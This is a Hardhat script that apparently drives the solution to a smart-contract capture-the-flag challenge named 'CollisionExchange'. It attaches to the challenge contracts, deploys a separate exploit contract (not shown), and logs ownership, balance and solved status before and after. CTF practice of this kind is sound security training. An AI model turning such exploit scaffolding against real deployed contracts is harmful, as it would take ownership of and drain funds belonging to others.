// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  

  //get accounts and verify balances
  const [deployer,accounts] = await hre.ethers.getSigners();
  console.log("Signer is: ", accounts.address);
  console.log("Deployer is: ", deployer.address);

  
  //set addresses for current challenge
  const setupAddress = "0x5e40D0d98126323b81246008d386a93BA091704f";
  const challengeAddress = "0xE442a00a4587677c945598e19DF41822e851c1DE";
  const challengeName = "CollisionExchange";
  const setupName = "Setup";
  

  
  //attach setup
  const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
  //attach challenge
  const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);
  console.log("chlnge addr:", await setupContract.exchange());
  
    
  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(challengeAddress));

  //exploit logic
  console.log("Starting owner:", await challengeContract.owner());
  
  // deploy exploit contract
  const Exploit = await hre.ethers.getContractFactory("CollisionExploit");
  const exploit = await Exploit.connect(deployer).deploy(challengeAddress);
  await exploit.deployed();
  console.log("Setup deployed to:", exploit.address);

  
  
  
  console.log("New owner:", await challengeContract.owner());
  console.log("Ending balance:", await ethers.provider.getBalance(setupContract.exchange()));
  //console.log("Trade :", await orderBookContract.getTrade());
  
  
  

  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
